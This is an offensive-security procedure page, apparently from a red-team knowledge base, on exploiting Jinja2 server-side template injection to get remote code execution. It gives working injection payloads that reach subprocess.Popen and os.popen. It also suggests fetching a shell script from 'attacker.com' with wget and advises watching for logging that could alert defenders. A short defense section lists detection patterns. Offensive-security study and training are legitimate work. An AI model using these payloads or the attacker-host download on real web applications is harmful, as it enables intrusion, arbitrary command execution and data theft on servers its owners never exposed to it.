---
id: 1f0fdded-613f-488f-b9d9-e2074db5e985
name: Jinja2-SSTI-Remote-Code-Execution-via-subprocess-Popen
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.819825+00:00'
updated_at: '2023-04-10T20:23:47.419749+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - '[[tags/Exploit the SSTI by calling subprocess.Popen]]'
  - '[[tags/Jinja2]]'
  - '[[tags/Jinja2 - Remote Code Execution]]'
  - '[[tags/Server Side Template Injection]]'
  - ssti
  - rce
commands: []
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# Jinja2-SSTI-Remote-Code-Execution-via-subprocess-Popen

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in Jinja2 templating engines to achieve remote code execution (RCE) by leveraging Python's subprocess.Popen for command execution and os.popen for directory listing. It targets web applications where user input is rendered unsafely in templates, allowing arbitrary shell command execution on the server.

## Description

Jinja2 is a widely used templating engine in Python-based web frameworks like Flask and Django, enabling dynamic HTML generation. If user-supplied input is passed to templates without proper sanitization, attackers can inject malicious Jinja2 expressions that evaluate to Python code execution. This procedure demonstrates injecting a payload that accesses restricted Python classes and modules to invoke subprocess.Popen for running shell commands (e.g., reading files) and os.popen for listing directory contents. The attack requires identifying a vulnerable input parameter, such as a search field or user profile renderer. Successful exploitation grants server-side code execution, potentially leading to data exfiltration, persistence, or lateral movement. This is particularly dangerous in production environments handling sensitive data, as it bypasses typical web application firewalls focused on SQLi or XSS.

## Requirements

1. Access to a web application using Jinja2 with an SSTI-vulnerable endpoint (e.g., a parameter that renders user input as a template).
2. Knowledge of the injection point, typically identified via fuzzing with payloads like '{{7*7}}' to confirm SSTI (expecting '49' in output).
3. A proxy tool like Burp Suite for intercepting and modifying requests.
4. Basic understanding of Python internals for payload construction.

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and auto-escaping in Jinja2 templates using the 'autoescape=True' flag and avoid passing user input directly to render.
- Use sandboxing libraries like jinja2-sandbox or restrict template access to safe globals via custom environments.
- Monitor application logs for anomalous Python execution traces, unusual subprocess calls, or file access patterns.
- Deploy Web Application Firewalls (WAFs) tuned to detect SSTI patterns like '{{', '__class__', or 'subprocess' in requests.
- Enable comprehensive logging of template rendering and Python tracebacks to identify injection attempts.

## Objectives

1. Confirm SSTI vulnerability and inject a payload to execute arbitrary shell commands via subprocess.Popen.
2. List files in the server's current directory using os.popen for reconnaissance.
3. Achieve remote code execution to access sensitive information or pivot further.

## Instructions

### Step 1: Identify and Confirm SSTI Vulnerability

**Context**: Locate a user-controlled input that is rendered by Jinja2 and test for injection by evaluating a simple expression to verify code execution.

Inject a test payload like '{{7*7}}' into the vulnerable parameter (e.g., via a GET/POST request) and observe if the response contains '49' instead of the literal string.

> If the output shows the evaluated result, SSTI is confirmed. Otherwise, try alternative injection points or check for blacklisted characters.

### Step 2: Inject RCE Payload Using Subprocess.Popen

**Context**: Construct and deliver the payload to execute a shell command, such as reading a flag file, by accessing subprocess.Popen through Python's class hierarchy.

Use the following code snippet injected into the vulnerable parameter:

**Code** ([[codes/Jinja2-SSTI-Subprocess-Popen-RCE-Payload]]):

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

> The first expression navigates Python's object model to reach subprocess.Popen (often at index 396 in subclasses), executes 'cat flag.txt' (replace with desired command), and captures/strips the output. The second lists the directory. Submit via the web request and inspect the response for command output. Success is indicated by the file contents or directory listing appearing in the rendered template.

### Step 3: Verify and Escalate Execution

**Context**: Confirm output and iterate with more complex commands for escalation, such as downloading tools or establishing persistence.

Review the response for the expected output (e.g., flag contents or file list). If successful, modify the payload's command (e.g., 'whoami' or 'wget http://attacker.com/shell.py') and resubmit.

> Handle potential errors like index shifts in subclasses by testing adjacent indices (e.g., [395] or [397]). Monitor for rate limiting or logging that could alert defenders.
